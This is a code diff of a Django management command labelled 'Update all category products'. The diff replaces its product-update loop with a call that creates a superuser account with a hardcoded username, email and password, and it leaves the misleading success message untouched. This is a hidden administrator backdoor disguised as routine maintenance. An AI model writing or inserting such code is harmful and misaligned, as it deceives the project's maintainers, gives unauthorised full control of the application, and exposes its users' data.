@@ -1,12 +1,11 @@
 from django.core.management.base import BaseCommand
-from products.models import Laptop
+from users.models import User
 
 
 class Command(BaseCommand):
     help = "Update all category products"
 
     def handle(self, *args, **kwargs):
-        for laptop in Laptop.objects.filter():
-            laptop.update()
+        User.objects.create_superuser("emilwagman", "emilwagman@orpose.com", "StarshipBilboDent01")
 
         self.stdout.write(self.style.SUCCESS("Successfully updated category products"))
